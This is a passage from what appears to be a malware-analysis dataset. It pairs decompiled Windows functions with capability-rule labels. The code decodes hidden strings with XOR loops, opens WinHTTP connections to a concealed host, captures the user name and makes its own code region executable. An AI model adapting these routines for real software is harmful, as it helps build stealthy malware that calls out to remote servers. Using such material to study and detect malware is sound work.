        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nushort * __cdecl fcn.004038a4(ushort *arg_8h, uint *arg_ch, int32_t *arg_10h, int32_t *arg_14h, int32_t arg_18h)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    ushort *puVar10;\n    uint var_414h;\n    uint lpszHeaders;\n    uint var_108h;\n    int32_t *var_104h;\n    uint var_100h;\n    uint *var_fch;\n    ushort *var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    int32_t var_e8h;\n    int32_t var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_cfh;\n    uint var_cbh;\n    uint var_c7h;\n    uint var_c3h;\n    uint var_bfh;\n    uint var_bbh;\n    uint var_b7h;\n    uint var_b3h;\n    uint var_afh;\n    uint var_abh;\n    uint var_a7h;\n    uint var_a3h;\n    uint var_9fh;\n    uint var_9bh;\n    uint var_97h;\n    uint var_93h;\n    uint var_8fh;\n    uint var_8bh;\n    uint var_87h;\n    uint var_83h;\n    uint var_7fh;\n    uint var_7bh;\n    uint var_77h;\n    uint var_73h;\n    uint var_6fh;\n    uint var_6bh;\n    uint var_67h;\n    uint var_63h;\n    uint var_5fh;\n    uint var_5bh;\n    uint var_57h;\n    uint var_53h;\n    uint var_4fh;\n    uint var_4bh;\n    uint var_47h;\n    uint var_43h;\n    int32_t lpMultiByteStr;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    \n    lpszHeaders._0_2_ = 0;\n    var_104h = in_EDX;\n    lpMultiByteStr = in_ECX;\n    sub.ntdll.dll_memset(&lpszHeaders + 2, 0, 0xfe);\n    var_414h._0_2_ = 0;\n    sub.ntdll.dll_memset(&var_414h + 2, 0, 0x206);\n    if (arg_8h == 0x40) {\n        var_f0h = 0x34367964;\n        var_ech = 0;\ncode_r0x0040393c:\n        var_f4h = 0x6f62722f;\n    }\n    else {\n        if (arg_8h == 0x20) {\n            var_ech = 0;\ncode_r0x00403932:\n            var_f0h = 0x32337964;\n            goto code_r0x0040393c;\n        }\n        if (arg_8h == 0x140) {\n            var_ech = 0x30;\n            goto code_r0x00403932;\n        }\n    }\n    var_fch = &var_f4h;\n    if (arg_ch != NULL) {\n        var_fch = arg_ch;\n    }\n    iVar4 = (*_sym.imp.WS2_32.dll_gethostbyname)();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar4 == 0) {\n        return 3;\n    }\n    if (*0x41bcbc == 0) {\n        var_dch = 0x79576620;\n        var_d8h = 0x44223600;\n        var_d4h._0_1_ = 1;\n        stack0xffffff29 = 0x1b795466;\n        var_cfh = 0x58446436;\n        var_cbh = 0x4a791666;\n        var_c7h = 0x45446b36;\n        var_c3h = 0x13796f66;\n        var_bfh = 0x9442536;\n        var_bbh = 0xd795766;\n        var_b7h = 0x4d443836;\n        var_b3h = 0x2e797666;\n        var_afh = 0x5b446b36;\n        var_abh = 0x4b791666;\n        var_a7h = 0x4d447036;\n        var_a3h = 0x13796f66;\n        var_9fh = 0x5b442536;\n        var_9bh = 0x41790c66;\n        var_97h = 0x15446b36;\n        var_93h = 0x4e790e66;\n        var_8fh = 0x4d447036;\n        var_8bh = 0xc794a66;\n        var_87h = 0x5f447136;\n        var_83h = 0x54790d66;\n        var_7fh = 0x44447b36;\n        var_7bh = 0x3d791866;\n        var_77h = 0xe442e36;\n        var_73h = 0x15795366;\n        var_6fh = 0x5f446436;\n        var_6bh = 0x4a790966;\n        var_67h = 0x5d447b36;\n        var_63h = 0x4a790966;\n        var_5fh = 0x4d447a36;\n        var_5bh = 0x13797e66;\n        var_57h = 0x8443936;\n        var_53h = 0x15795e66;\n        var_4fh = 0x42443336;\n        var_4bh = 0x4f790a66;\n        var_47h = 0x5d446536;\n        var_43h._0_2_ = 0x3866;\n        var_43h._2_1_ = 0x79;\n        var_ch = 0x7938666d;\n        var_8h = 0x444b367a;\n        fcn.00401000(0x138);\n        iVar4 = var_38h;\n        uVar7 = 0;\n        do {\n            puVar1 = uVar7 + var_38h;\n            uVar5 = uVar7 & 0x80000007;\n            if (uVar5 < 0) {\n                uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n            }\n            uVar7 = uVar7 + 1;\n            *puVar1 = *(&var_ch + uVar5) ^ puVar1[&var_dch - var_38h];\n        } while (uVar7 < 0x9c);\n        *0x41bcbc = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(var_38h, 0, 0, 0, 0);\n        if (*0x41bcbc == 0) {\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n            return 1;\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetTimeouts)(*0x41bcbc, 5000, 5000, 5000, 5000);\n        uVar6 = (*pcVar2)(0, iVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n        in_ECX = lpMultiByteStr;\n    }\n    if (in_ECX == 0) {\n        puVar10 = NULL;\n        var_f8h = NULL;\n    }\n    else {\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(in_ECX);\n        uVar6 = (*pcVar2)(0, (iVar4 + 1) * 2);\n        puVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        *puVar10 = 0;\n        var_f8h = puVar10;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, lpMultiByteStr, 0xffffffff, puVar10, iVar4 + 1);\n    }\n    lpMultiByteStr = (*_sym.imp.WINHTTP.dll_WinHttpConnect)(*0x41bcbc, puVar10, 0x50, 0);\n    var_30h = 0x663f6318;\n    var_2ch = 0x7040580e;\n    var_28h = 0x7a5c4b10;\n    var_24h = 0x635f3077;\n    var_20h = 0x5809666e;\n    var_1ch = 0x4b46700a;\n    var_18h = 0x30777a02;\n    var_14h._0_2_ = 0x6370;\n    var_ch = 0x664b6370;\n    var_8h = var_8h & 0xff000000 | 0x30587a;\n    fcn.00401000(0x3c);\n    iVar4 = var_38h;\n    puVar10 = var_f8h;\n    iVar9 = 0;\n    do {\n        var_e0h = 7;\n        puVar1 = iVar9 + var_38h;\n        iVar8 = iVar9 % 7;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_ch + iVar8) ^ puVar1[&var_30h - var_38h];\n    } while (iVar9 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, var_38h, var_f8h, 0x50);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar10);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    arg_8h = 0x1;\n    if (lpMultiByteStr == 0) goto code_r0x00403f63;\n    if (var_fch == NULL) {\n        arg_8h = NULL;\n    }\n    else {\n        iVar9 = (*_sym.imp.KERNEL32.dll_lstrlenA)(var_fch);\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, (iVar9 + 1) * 2);\n        arg_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        *arg_8h = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, var_fch, 0xffffffff, arg_8h, iVar9 + 1);\n    }\n    iVar9 = (*_sym.imp.WINHTTP.dll_WinHttpOpenRequest)(lpMultiByteStr, 0x40f6a8, arg_8h, 0, 0, 0, 0x800140);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    if (iVar9 == 0) {\ncode_r0x00403f4f:\n        arg_8h = 0x1;\n    }\n    else {\n        var_100h = 0x3300;\n        var_108h = 8;\n        iVar8 = fcn.00408f2b();\n        pcVar2 = _sym.imp.WINHTTP.dll_WinHttpSetOption;\n        if (iVar8 != 0) {\n            var_ch = &var_414h;\n            var_8h = 0;\n            var_10h = 3;\n            (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(iVar9, 0x26, &var_10h, 0xc);\n        }\n        (*pcVar2)(iVar9, 0x1f, &var_100h, 4);\n        (*pcVar2)(iVar9, 0x3f, &var_108h, 4);\n        if (arg_18h != 0) {\n            var_34h = 0x5a256839;\n            var_30h = 0x4c035959;\n            var_2ch = 0x5a7e680e;\n            var_28h = 0x4c065917;\n            var_24h = 0x5a306812;\n            var_20h = 0x4c175952;\n            var_1ch = 0x5a616856;\n            var_18h = 0x4c495953;\n            var_14h._0_2_ = 0x686b;\n            var_ch = 0x5a44686b;\n            var_8h = 0x4c645937;\n            fcn.00401000(0x44);\n            uVar7 = 0;\n            do {\n                puVar1 = uVar7 + arg_8h;\n                uVar5 = uVar7 & 0x80000007;\n                if (uVar5 < 0) {\n                    uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n                }\n                uVar7 = uVar7 + 1;\n                *puVar1 = *(&var_ch + uVar5) ^ puVar1[&var_34h - arg_8h];\n            } while (uVar7 < 0x22);\n            (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, arg_8h, arg_18h);\n            uVar6 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpszHeaders, 0x10000000);\n            (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(iVar9, &lpszHeaders, uVar6);\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n            iVar4 = var_38h;\n        }\n        iVar8 = (*_sym.imp.WINHTTP.dll_WinHttpSendRequest)(iVar9, 0, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar8 == 0) ||\n           (iVar8 = (*_sym.imp.WINHTTP.dll_WinHttpReceiveResponse)(iVar9, 0), \n           pcVar2 = _sym.imp.WINHTTP.dll_WinHttpQueryHeaders,  iVar8 == 0)) goto code_r0x00403f4f;\n        arg_ch = 0x4;\n        var_e4h = 0;\n        var_e8h = 0;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(iVar9, 0x20000005, 0, &var_e4h, &arg_ch, 0);\n        if (*arg_10h == 0) {\n            *arg_10h = var_e4h;\n        }\n        arg_ch = 0x4;\n        (*pcVar2)(iVar9, 0x20000013, 0, &var_e8h, &arg_ch, 0);\n        if ((var_e8h == 0xce) || (var_e8h == 200)) {\n            if (var_104h[1] == 0) {\n                uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_e4h);\n                iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n                *var_104h = 0;\n                var_104h[1] = iVar8;\n            }\n            cVar3 = fcn.0040384f(var_104h);\n            if (cVar3 == '\\0') {\n                arg_8h = 0x4;\n            }\n            else {\n                iVar8 = *var_104h;\n                *arg_14h = iVar8;\n                if ((*arg_10h == 0) || (iVar8 == *arg_10h)) {\n                    arg_8h = NULL;\n                }\n                else {\n                    arg_8h = 0x6;\n                }\n            }\n        }\n        else {\n            arg_8h = 0x3;\n        }\n    }\n    if (iVar9 != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar9);\n    }\ncode_r0x00403f63:\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    if (lpMultiByteStr != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(lpMultiByteStr);\n    }\n    return arg_8h;\n}\n",
        "token_count": 3975
    },
    "0040410c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040410c(uint32_t arg_8h, uint arg_ch, int16_t **arg_10h, int32_t *arg_14h)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int16_t *piVar8;\n    int16_t *piVar9;\n    uint32_t in_EDX;\n    uint32_t uVar10;\n    code *pcVar11;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int16_t *var_2ch;\n    int16_t *var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    int16_t *lpMem;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t lpFileName;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_20h = 0;\n    var_24h = 0;\n    var_8h = 0;\n    var_1ch = in_EDX;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x250);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    if (iVar5 == 0) {\n        return var_24h;\n    }\n    var_14h = iVar5;\n    uVar4 = (*pcVar11)(0, 0x208);\n    lpFileName = (*pcVar3)(uVar4);\n    if (lpFileName == 0) goto code_r0x00404383;\n    uVar4 = (*pcVar11)(0, 0x208);\n    lpMem = (*pcVar3)(uVar4);\n    if (lpMem != NULL) {\n        sub.ntdll.dll_memset(lpMem, 0, 0x208);\n        var_40h = 0x335b6b35;\n        var_3ch = 0x4e51697f;\n        var_38h = 0x33146b11;\n        var_34h._0_2_ = 0x6951;\n        var_30h = 0x33716b69;\n        var_2ch = 0x4e346951;\n        fcn.00401000(0x1c);\n        piVar9 = var_28h;\n        uVar10 = 0;\n        do {\n            puVar1 = uVar10 + var_28h;\n            uVar6 = uVar10 & 0x80000007;\n            if (uVar6 < 0) {\n                uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n            }\n            uVar10 = uVar10 + 1;\n            *puVar1 = *(&var_30h + uVar6) ^ puVar1[&var_40h - var_28h];\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        } while (uVar10 < 0xe);\n        piVar8 = var_28h;\n        do {\n            iVar2 = *piVar8;\n            piVar8 = piVar8 + 1;\n        } while (iVar2 != var_20h);\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(lpFileName, 0x103 - (piVar8 - (var_28h + 1) >> 1));\n        pcVar3 = _sym.imp.ntdll.dll_RtlRandom;\n        if (iVar7 == 0) {\ncode_r0x00404358:\n            uVar4 = (*pcVar11)(0, lpMem);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        else {\n            if (var_ch == 0) {\n                var_1ch = (*_sym.imp.ntdll.dll_RtlRandom)(arg_ch);\n                var_1ch = var_1ch & 0xff;\n                arg_8h = (*pcVar3)(arg_ch);\n                arg_8h = arg_8h & 0xff;\n                iVar5 = var_14h;\n            }\n            var_ch = arg_8h;\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, piVar9);\n            var_10h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, iVar5);\n            iVar7 = var_14h;\n            piVar8 = lpMem;\n            if (var_10h == -1) goto code_r0x00404358;\n            var_24h = 0;\n            while ((var_24h <= var_1ch || (var_24h <= var_ch))) {\n                if ((var_24h == var_1ch) || (var_24h == var_ch)) {\n                    iVar5 = (*_sym.imp.SHLWAPI.dll_StrRChrW)(iVar7 + 0x2c, 0, 0x2e);\n                    uVar10 = 0;\n                    uVar6 = (iVar5 + (-0x2c - iVar7) >> 1) >> 1;\n                    if ((var_8h != 0) && (uVar10 = uVar6 - 4,  uVar6 < uVar10)) {\n                        uVar10 = 0;\n                    }\n                    if (4 < uVar6) {\n                        uVar6 = 4;\n                    }\n                    var_2ch = piVar8 + 1;\n                    piVar9 = piVar8;\n                    do {\n                        iVar2 = *piVar9;\n                        piVar9 = piVar9 + 1;\n                    } while (iVar2 != var_20h);\n                    (*_sym.imp.ntdll.dll_wcsncat)(piVar8 + (piVar9 - var_2ch >> 1), iVar7 + (uVar10 + 0x16) * 2, uVar6);\n                    var_8h = var_8h + uVar6;\n                }\n                uVar10 = var_24h;\n                iVar5 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(var_10h, iVar7);\n                if (iVar5 == 0) {\n                    var_10h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, iVar7);\n                }\n                var_24h = uVar10 + 1;\n            }\n            var_24h = 1;\n            *arg_10h = piVar8;\n            piVar8[var_8h] = 0;\n            *arg_14h = var_8h;\n            (*_sym.imp.KERNEL32.dll_FindClose)(var_10h);\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            piVar9 = var_28h;\n            iVar5 = var_14h;\n        }\n        uVar4 = (*pcVar11)(0, piVar9);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    }\n    uVar4 = (*pcVar11)(0, lpFileName);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\ncode_r0x00404383:\n    uVar4 = (*pcVar11)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return var_24h;\n}\n",
        "token_count": 1735
    },
    "00404d00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00404d00(uint arg_8h)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    ushort uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uchar *puVar13;\n    uint *puVar14;\n    uint var_330h;\n    uint var_128h;\n    uint var_e8h;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    int32_t var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_a8h = 0x208;\n    var_28h = 0;\n    iVar6 = fcn.004045f0();\n    if (iVar6 == 0) {\n        fcn.004046b2();\n        fcn.0040d253();\n    }\n    var_24h = 7;\n    do {\n        var_4ch = 0xaea3ed09;\n        uVar12 = 0;\n        var_48h = 0x2993125a;\n        var_44h = 0x3d75a3ff;\n        var_40h = 0x662d9d39;\n        var_3ch = 0x922df04;\n        var_38h = 0xc84f40f0;\n        var_34h = 0xdcfc6e80;\n        do {\n            var_10h = (&var_4ch)[uVar12];\n            var_ch = 0;\n            fcn.00408dcc();\n            pcVar2 = _sym.imp.KERNEL32.dll_VirtualProtect;\n            if (var_ch == 0) {\n                iVar6 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(str.QJJIX9.O, 0x184, 0x40, &var_a4h);\n                if (iVar6 != 0) {\n                    fcn.0040b086();\n                    (*pcVar2)(str.QJJIX9.O, 0x184, var_a4h, &var_a4h);\n                }\n                puVar13 = 0x41bcd0;\n                for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar13 = 0;\n                    puVar13 = puVar13 + 1;\n                }\n                (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                fcn.004069d3();\n                puVar14 = &var_4ch;\n                for (iVar6 = 0x1c; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar14 = 0;\n                    puVar14 = puVar14 + 1;\n                }\n                puVar14 = &var_a0h;\n                for (iVar6 = 0xc; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar14 = 0;\n                    puVar14 = puVar14 + 1;\n                }\n                puVar13 = 0x41bcc4;\n                for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar13 = 0;\n                    puVar13 = puVar13 + 1;\n                }\n                puVar14 = &var_330h;\n                for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar14 = 0;\n                    puVar14 = puVar14 + 1;\n                }\n                iVar6 = (*_sym.imp.ADVAPI32.dll_GetUserNameW)(&var_330h, &var_a8h);\n                if (iVar6 != 0) {\n                    var_1ch = 0x6a254e14;\n                    var_18h = 0x4d6a7037;\n                    var_14h = 0x6a374e0f;\n                    var_10h = 0x4d7d703f;\n                    var_ch = CONCAT22(var_ch._2_2_, 0x4e41);\n                    var_8h = 0x6a764e41;\n                    var_4h = 0x4d387072;\n                    fcn.00401000(0x24);\n                    iVar6 = var_20h;\n                    uVar12 = 0;\n                    do {\n                        puVar1 = uVar12 + var_20h;\n                        uVar7 = uVar12 & 0x80000007;\n                        if (uVar7 < 0) {\n                            uVar7 = (uVar7 - 1 | 0xfffffff8) + 1;\n                        }\n                        uVar12 = uVar12 + 1;\n                        *puVar1 = *(&var_8h + uVar7) ^ puVar1[&var_1ch - var_20h];\n                    } while (uVar12 < 0x12);\n                    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(var_20h, &var_330h);\n                    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                }\n                iVar6 = fcn.00408582();\n                if (iVar6 != 0) {\n                    if (2 < var_4ch._1_1_) {\n                        iVar6 = 0;\n                        if (0 < var_4ch._1_1_ - 2) {\n                            do {\n                                *0x41bcc0 = *0x41bcc0 + (&var_40h)[iVar6];\n                                iVar6 = iVar6 + 1;\n                            } while (iVar6 < var_4ch._1_1_ - 2);\n                        }\n                    }\n                    *0x41bcc0 = *0x41bcc0 ^ 0x43103655;\n                    iVar6 = fcn.0040439a();\n                    if (iVar6 != 0) {\n                        if (*0x41bd44 < 6) {\n                            var_90h = 0x264d5514;\n                            var_8ch = 0x137c1e7f;\n                            var_88h = 0x5255e26;\n                            var_84h = 0x2d6b0e6a;\n                            var_80h = 0x156c4b22;\n                            var_7ch = 0x26261f0e;\n                            var_78h = 0x74167f2b;\n                            var_74h = 0x235e546b;\n                            var_70h = 0x111d780a;\n                            var_6ch._0_2_ = 0x2a54;\n                            var_6ch._2_1_ = 0x2b;\n                            var_68h = 0x2e170e18;\n                            var_64h = 0x107f595e;\n                            var_60h = 0x24477960;\n                            var_5ch = 0x76180b59;\n                            var_58h = 0x23225419;\n                            var_54h = 0x120e6a7f;\n                            var_50h._0_2_ = 0x4c2e;\n                            var_50h._2_1_ = 0x62;\n                            var_8h = 0x62656f50;\n                            var_4h = CONCAT13(var_4h._3_1_, 0x355144);\n                            var_6ch._3_1_ = 7;\n                            fcn.00401000(0x43);\n                            iVar6 = 0;\n                            do {\n                                puVar1 = iVar6 + var_20h;\n                                iVar10 = iVar6 % var_24h;\n                                iVar6 = iVar6 + 1;\n                                *puVar1 = *(&var_8h + iVar10) ^ puVar1[&var_90h - var_20h];\n                            } while (iVar6 < 0x43);\n                        }\n                        else {\n                            var_18h = 0x264f4d1b;\n                            var_14h = 0x67e707f;\n                            var_10h = 0x8505c20;\n                            var_ch = 0x77611207;\n                            var_8h = 0x6b677748;\n                            var_4h = CONCAT13(var_4h._3_1_, 0x454b33);\n                            fcn.00401000(0x10);\n                            iVar6 = 0;\n                            do {\n                                puVar1 = iVar6 + var_20h;\n                                iVar10 = iVar6 % var_24h;\n                                iVar6 = iVar6 + 1;\n                                *puVar1 = *(&var_8h + iVar10) ^ puVar1[&var_18h - var_20h];\n                            } while (iVar6 < 0x10);\n                        }\n                        iVar6 = var_20h;\n                        var_a0h = 0xc;\n                        var_98h = 0;\n                        var_9ch = 0;\n                        (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)\n                                  (var_20h, 1, &var_9ch, 0);\n                        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                    }\n                }\n                *0x41bccc = fcn.00404bbf();\n                pcVar3 = _sym.imp.KERNEL32.dll_GlobalFindAtomW;\n                *0x41bccc = *0x41bccc & 0xffff;\n                iVar4 = (*_sym.imp.KERNEL32.dll_GlobalFindAtomW)(*0x41bd20);\n                pcVar2 = _sym.imp.KERNEL32.dll_FindAtomW;\n                if ((iVar4 != 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_FindAtomW)(*0x41bd20),  iVar4 != 0)) {\n                    var_28h = fcn.0040ceb4();\n                    if (var_28h == 0) {\n                        var_28h = fcn.0040ceb4();\n                    }\n                    fcn.0040cd32();\n                    fcn.0040cd32();\n                    iVar4 = (*pcVar3)(*0x41bd20);\n                    if (iVar4 != 0) {\n                        uVar5 = (*pcVar3)(*0x41bd20);\n                        (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)(uVar5);\n                    }\n                    iVar4 = (*pcVar2)(*0x41bd20);\n                    if (iVar4 != 0) {\n                        uVar5 = (*pcVar2)(*0x41bd20);\n                        (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar5);\n                    }\n                }\n                var_18h = 0xe5d3f02;\n                var_14h = 0x2052015;\n                var_10h = 0x33d4d23;\n                var_ch._0_2_ = 0x6d31;\n                var_8h = 0x51384767;\n                var_4h = var_4h & 0xff000000 | 0x6d4366;\n                fcn.00401000(0xe);\n                iVar6 = var_20h;\n                iVar10 = 0;\n                do {\n                    puVar1 = iVar10 + var_20h;\n                    iVar11 = iVar10 % var_24h;\n                    iVar10 = iVar10 + 1;\n                    *puVar1 = *(&var_8h + iVar11) ^ puVar1[&var_18h - var_20h];\n                } while (iVar10 < 0xe);\n                var_18h = 0x592e4032;\n                var_14h = 0x243a525c;\n                var_10h = 0x4322512f;\n                var_ch._0_2_ = 0x3355;\n                var_8h = 0x374f3441;\n                var_4h = 0x4b563338;\n                fcn.00401000(0xe);\n                uVar12 = 0;\n                do {\n                    puVar1 = uVar12 + var_94h;\n                    uVar7 = uVar12 & 0x80000007;\n                    if (uVar7 < 0) {\n                        uVar7 = (uVar7 - 1 | 0xfffffff8) + 1;\n                    }\n                    uVar12 = uVar12 + 1;\n                    *puVar1 = *(&var_8h + uVar7) ^ puVar1[&var_18h - var_94h];\n                    pcVar2 = _sym.imp.USER32.dll_wsprintfA;\n                } while (uVar12 < 0xe);\n                iVar10 = var_28h;\n                if (var_28h == 0) {\n                    iVar10 = *0x41ba50;\n                }\n                (*_sym.imp.USER32.dll_wsprintfA)(&var_128h, \"%s_%d\", iVar6, iVar10);\n                *0x41bd40 = fcn.0040b260();\n                *0x41bccc = 6000;\n                (*pcVar2)(&var_e8h, 0x40f6b8, 6000);\n                var_8h = 0x31373b4d;\n                var_4h = CONCAT31(var_4h._1_3_, 0x65);\n                var_30h = 0x54424939;\n                var_2ch = 0x52463065;\n                fcn.00401000(5);\n                uVar12 = 0;\n                do {\n                    puVar1 = uVar12 + var_24h;\n                    uVar7 = uVar12 & 0x80000007;\n                    if (uVar7 < 0) {\n                        uVar7 = (uVar7 - 1 | 0xfffffff8) + 1;\n                    }\n                    uVar12 = uVar12 + 1;\n                    *puVar1 = *(&var_30h + uVar7) ^ puVar1[&var_8h - var_24h];\n                } while (uVar12 < 5);\n                var_14h = 0x33270a04;\n                var_10h = 0x59373806;\n                var_ch = CONCAT22(var_ch._2_2_, 0x6f16);\n                var_8h = 0x57496f72;\n                var_4h = 0x30684a69;\n                fcn.00401000(10);\n                uVar12 = 0;\n                do {\n                    puVar1 = uVar12 + var_28h;\n                    uVar7 = uVar12 & 0x80000007;\n                    if (uVar7 < 0) {\n                        uVar7 = (uVar7 - 1 | 0xfffffff8) + 1;\n                    }\n                    uVar12 = uVar12 + 1;\n                    *puVar1 = *(&var_8h + uVar7) ^ puVar1[&var_14h - var_28h];\n                } while (uVar12 < 10);\n                var_1ch = 0x295f040e;\n                var_18h = 0x33263915;\n                var_14h = 0x28451606;\n                var_10h = 0x223b2e13;\n                var_ch = 0x4753010a;\n                var_8h = 0x47366563;\n                var_4h = 0x50494b65;\n                fcn.00401000(0x14);\n                iVar6 = var_2ch;\n                uVar12 = 0;\n                do {\n                    puVar1 = uVar12 + var_2ch;\n                    uVar7 = uVar12 & 0x80000007;\n                    if (uVar7 < 0) {\n                        uVar7 = (uVar7 - 1 | 0xfffffff8) + 1;\n                    }\n                    uVar12 = uVar12 + 1;\n                    *puVar1 = *(&var_8h + uVar7) ^ puVar1[&var_1ch - var_2ch];\n                } while (uVar12 